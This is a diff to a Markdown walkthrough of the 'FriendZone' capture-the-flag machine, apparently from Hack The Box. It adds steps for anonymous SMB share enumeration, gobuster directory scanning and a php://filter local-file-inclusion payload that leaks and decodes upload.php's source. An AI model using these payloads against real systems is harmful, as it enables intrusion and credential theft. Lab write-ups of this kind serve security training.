@@ -139,6 +139,7 @@ Notes:
          - While inside the client:
            ```console
            dir
+           
            # creds.txt      N     57  Wed Oct 10 07:52:42 2018
            get creds.txt
            ```
@@ -155,6 +156,9 @@ Notes:
          - While inside the client:
            ```console
            dir
+           
+           # .              D      0  Thu Jan 17 04:03:49 2019
+           # ..             D      0  Thu Jan 24 05:51:02 2019
            ```
       Notes:
       - __general__ share contains __admin credentials__
@@ -257,7 +261,6 @@ Notes:
      <address>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 443</address>
      </body></html>
      ```
-   
      Notes:
      - __friendzone.red__ is another _domain name_
      - Try accessing subdomains over __https__
@@ -365,7 +368,7 @@ Notes:
      ```
      /dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=timestamp
      ```
-     Using __php://filter__ works:
+     Page Source:
      ```html
      <title>FriendZone Admin !</title>
      <br><br><br>
@@ -409,7 +412,7 @@ Notes:
      ```console
      echo PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo= | base64 --decode
      ```
-     The source code for __timestamp.php__ appears:
+     The source code for __dashboard.php__ appears:
      ```PHP
      <?php
 
@@ -475,6 +478,7 @@ Notes:
      Notes:
      - It accepts non-image files
      - The directory of the uploaded files is still unknown
+     
    - Find the uploaded files
      ```console
      gobuster -k -u https://uploads.friendzone.red/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt 
@@ -489,7 +493,62 @@ Notes:
      ```
      under development !
      ```
-     Note:
+     Notes:
      - Perhaps "under development" points to the __Development share__ from earlier
+
+3. Check if __test.php__ was really successfully uploaded
+   - Reopen __Development share__:
+     ```console
+     smbclient \\\\WORKGROUP\\Development -I 10.10.10.123 -N
+     ```
+     While inside the client:
+     ``` console
+     dir
+
+     # .              D      0  Thu Jan 17 04:03:49 2019
+     # ..             D      0  Thu Jan 24 05:51:02 2019
+     ```
+     Notes:
+     - The __Development share__ is still empty
      
-3. Linking the __Development share__ and __dashboard.php__
+   - Try to read the source code of __uploads.php__
+     ```
+     /dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../uploads/upload
+     ```
+     Page Source:
+     ```html
+     <title>FriendZone Admin !</title>
+     <br><br><br>
+     <center><h2>Smart photo script for friendzone corp !</h2></center>
+     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>
+     <center><img src='images/a.jpg'></center>
+     <center><h1>Something went worng ! , the script include wrong param !</h1></center>
+     PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K
+     ```
+     Decoding the __base64__ output:
+     ```console
+     echo PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K | base64 --decode
+     ```
+     The source code for __../uploads/upload.php__ appears:
+     ```PHP
+     <?php
+
+     // not finished yet -- friendzone admin !
+
+     if(isset($_POST["image"])){
+
+     echo "Uploaded successfully !<br>";
+     echo time()+3600;
+     }else{
+
+     echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";
+
+     }
+
+     ?>
+     ```
+     Notes:
+     - The uploaded file is not saved anywhere...
+     - https://uploads.friendzone.red is actually a dead end
+     
+4. Linking the __Development share__ and __dashboard.php__
